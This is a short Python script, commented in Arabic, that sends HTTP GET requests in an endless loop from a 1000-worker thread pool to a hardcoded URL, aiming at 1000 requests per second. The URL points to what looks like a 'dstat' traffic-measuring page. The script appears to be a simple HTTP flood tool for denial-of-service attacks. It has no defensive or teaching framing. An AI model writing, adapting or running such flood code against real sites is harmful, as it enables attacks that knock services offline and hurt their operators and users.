import requests
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# إعدادات التحكم في عدد الخيوط والطلبات في الثانية
MAX_REQUESTS_PER_SECOND = 1000
TIME_BETWEEN_REQUESTS = 1.0 / MAX_REQUESTS_PER_SECOND  # الوقت بين كل طلب

# العنوان الذي سيتم إرسال الطلبات إليه
url = "https://dstat.countbot.uk/"

# قفل لتجنب إرسال طلبات متعددة في نفس اللحظة
lock = Lock()

def send_request():
    with lock:
        # إرسال الطلب إلى الموقع
        try:
            response = requests.get(url)
            print(f"تم إرسال الطلب بنجاح. رمز الاستجابة: {response.status_code}")
        except requests.RequestException as e:
            print(f"حدث خطأ أثناء إرسال الطلب: {e}")

def execute_requests():
    # استخدام ThreadPoolExecutor لإرسال الطلبات عبر خيوط متعددة
    with ThreadPoolExecutor(max_workers=MAX_REQUESTS_PER_SECOND) as executor:
        while True:
            # إرسال طلبات على مدار الوقت المحدد
            executor.submit(send_request)
            time.sleep(TIME_BETWEEN_REQUESTS)

if __name__ == "__main__":
    execute_requests()
